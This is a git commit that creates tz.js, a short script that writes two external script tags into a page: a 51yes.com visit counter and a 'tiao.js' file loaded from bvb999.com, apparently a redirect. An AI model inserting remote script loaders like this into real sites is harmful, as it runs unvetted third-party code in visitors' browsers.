f3cbd7388a26dcd5fe32b1911235cc06e3e42027
js88888888 <jsjsjs888@outlook.com>
2015-11-19 11:00:46 +0800

    Create tz.js

---
+++ dfzq1/5/tz.js
@@ -0,0 +1,4 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=383530534&logo=12\" charset=\"gb2312\"><\/script>");
+
+
+document.writeln("<script src=http:\/\/\www.bvb999.com\/dfzq1/tiao.js ><\/script>");
